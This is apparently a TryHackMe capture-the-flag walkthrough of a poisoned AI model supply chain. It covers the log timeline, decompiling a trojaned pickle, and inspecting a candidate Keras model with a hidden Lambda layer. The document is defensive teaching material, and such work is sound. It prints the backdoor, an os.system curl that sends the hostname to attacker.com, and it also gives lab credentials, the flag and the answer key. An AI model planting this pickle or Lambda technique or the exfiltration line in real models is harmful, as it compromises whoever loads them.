# TryHackMe: Payload — Walkthrough

**Date:** 2026-11-04  
**Room:** Payload  
**Analyst:** Will Lawson  
**Category:** AI Supply Chain Security / Incident Response / Malicious Model Analysis

---

## Overview

TryTrainMe's production code-review model started beaconing to an unknown address, and a SOC rule blocked it at 03:14. The incident materials sit at `/opt/supply-chain/incident/`. The job was to build the timeline from the logs, decompile the trojaned production model, and assess a staged replacement model before engineering deployed it. The final flag was split between a network capture and the candidate model.

**Flag:** `THM{b4ckd00r_1n_pl41n_s1ght}`

---

## Getting On the Box

I connected from my WSL Kali over the THM VPN using the provided credentials:

```bash
ssh analyst@10.146.157.12    # password: analyst123
```

The login banner listed the lab tools (`fickling`, `modelscan`, `pip-audit`, `syft`, `inspect_h5_model.py`), which told me most of the work would be static analysis of model files.

## Mapping the Incident Directory

Before reading anything, I wanted the full inventory:

```bash
find /opt/supply-chain/incident -type f -exec ls -la {} \;
```

That showed three log files, five model files (`original_model.pkl`/`.safetensors`, `production_model.pkl`, `baseline_model.h5`, `candidate_model.h5`), a checksum file and a `requirements.txt`. The `production_model.pkl` stood out right away — 4.2 MB against 3.7 KB for `original_model.pkl`, a huge jump for a "v2" of the same model.

---

## Building the Timeline (Q1, Q2, Q5)

The logs were tiny, so I read all three in one pass:

```bash
cd /opt/supply-chain/incident/logs && for f in deployment.log network.log beacon_capture.log; do echo "=== $f"; cat $f; done
```

**`deployment.log`** told the whole supply-chain story:

- 2024-01-05 — `code-review-bert` v1.0.0 pulled from `huggingface.co/verified-ml-team/...` and deployed.
- 2024-01-26 14:32 — an ML engineer requested an update from `huggingface.co/trustworthy-ai-lab/code-review-bert-v2`. The registry even logged a `WARN New source organisation detected: trustworthy-ai-lab` — and deployed `production_model.pkl` anyway.
- 2024-02-16 03:14 — SOC alert for outbound HTTPS to `attacker.com:443`.

So the replacement came from **`trustworthy-ai-lab`** (Q1), and Jan 26 → Feb 16 is **21 days** (Q2) — matching the room's "three weeks ago" hint.

**`network.log`** showed the inference server (`10.0.1.50`) mixing normal traffic to `api.internal.trytrainme.com` with growing connections to `attacker.com` (`185.234.72.19`) — 4 KB, 8 KB, 16 KB, then 32 KB at 03:13:47 when it was finally `BLOCKED`.

**`beacon_capture.log`** caught that last session:

```
REQUEST POST /beacon HTTP/1.1
PAYLOAD host=ml-server-prod-01&id=THM{b4ckd00r_1n_
```

The method was **`POST`** (Q5), and the payload held the **first half of the flag**, `THM{b4ckd00r_1n_`, truncated when the SOC rule cut the session at 51 bytes.

---

## Decompiling the Production Model (Q3, Q4)

Given the size jump and the fact that it's a pickle, I went straight to `fickling` to decompile the pickle opcodes back into Python without loading (and executing) it:

```bash
fickling /opt/supply-chain/incident/models/production_model.pkl
```

```python
from os import system
_var0 = system('curl "http://attacker.com/beacon" -d "host=$(hostname)"')
result0 = _var0
```

That's the backdoor in full. On `pickle.load`, the `REDUCE` opcode calls **`os.system`** (Q3) with a `curl` that POSTs to `/beacon` (`-d` implies POST, consistent with the capture). The host's identity comes from the command substitution **`$(hostname)`** (Q4) — which is exactly where `host=ml-server-prod-01` in the beacon came from.

---

## Assessing the Candidate Model (Q6)

The room said `inspect_h5_model.py` was available, but calling it directly failed:

```
inspect_h5_model.py: command not found
```

It just wasn't on `PATH`, so I located it:

```bash
find / -name 'inspect_h5_model.py' 2>/dev/null
# /opt/supply-chain/tools/inspect_h5_model.py
```

Then ran it against the staged replacement:

```bash
python3 /opt/supply-chain/tools/inspect_h5_model.py /opt/supply-chain/incident/models/candidate_model.h5
```

```
[OK]      InputLayer           input_layer_2
[OK]      Flatten              flatten_2
[OK]      Dense                dense_4
[OK]      Dense                dense_5
[WARNING] Lambda               manipulate_output (function: manipulate_output)
          exfil_suffix: pl41n_s1ght}
```

Four normal layers and one **`Lambda`** layer named **`manipulate_output`** (Q6). Keras `Lambda` layers serialise arbitrary Python that runs at inference time — the H5 equivalent of the pickle `REDUCE` trick. Swapping the trojaned pickle for this "replacement" would just have traded one backdoor for another. The layer also carried `exfil_suffix: pl41n_s1ght}` — the **second half of the flag**.

---

## Recovering the Flag (Q7)

The attacker split the campaign ID so no single capture exposed it:

| Artefact | Fragment |
|---|---|
| `beacon_capture.log` | `THM{b4ckd00r_1n_` |
| `candidate_model.h5` (`manipulate_output` layer) | `pl41n_s1ght}` |

**Flag:** `THM{b4ckd00r_1n_pl41n_s1ght}`

---

## Answers

| Q | Answer |
|---|---|
| 1 — Replacement model's organisation | `trustworthy-ai-lab` |
| 2 — Days from deployment to SOC alert | `21` |
| 3 — Python function executing the shell command | `system` |
| 4 — Shell command capturing host identity | `hostname` |
| 5 — HTTP method in the beacon | `POST` |
| 6 — Suspicious layer in the candidate model | `manipulate_output` |
| 7 — Full flag | `THM{b4ckd00r_1n_pl41n_s1ght}` |

---

## Attack Chain

```
huggingface.co/trustworthy-ai-lab/code-review-bert-v2   (typosquat-style "trusted" org)
  │  WARN: new source organisation — deployed anyway (2024-01-26)
  ▼
production_model.pkl  (4.2 MB vs 3.7 KB original)
  │  pickle REDUCE → os.system(...) on load
  └─ curl -d "host=$(hostname)" http://attacker.com/beacon   (POST)
        │
        ▼  21 days dormant-ish beaconing, growing payloads
  2024-02-16 03:13:47  beacon to 185.234.72.19:443 BLOCKED (SOC_RULE_4821)
        └─ capture: id=THM{b4ckd00r_1n_

candidate_model.h5  (staged "fix", not deployed)
  └─ Lambda layer manipulate_output → arbitrary code at inference
        └─ exfil_suffix: pl41n_s1ght}
```

---

## Key Takeaways

| Point | Detail |
|---|---|
| **Heed registry warnings** | The pipeline flagged the new source org and deployed anyway. A source change should block, not warn. |
| **File size is a cheap signal** | 3.7 KB → 4.2 MB for a "v2" of the same model was suspicious before any tooling ran. |
| **Decompile, never load** | `fickling` reconstructs a pickle's behaviour statically; `pickle.load` would have executed the beacon. |
| **H5 isn't automatically safe** | Pickle-free formats can still carry code via Keras `Lambda` layers. Prefer weights-only formats like `safetensors` (the original even shipped one). |
| **Tools off PATH** | "Installed" doesn't mean on `PATH` — `find` it and call it with `python3`. |
| **Split IOCs** | The flag was split across network evidence and an undeployed artefact — correlate across sources, not just the obvious one. |
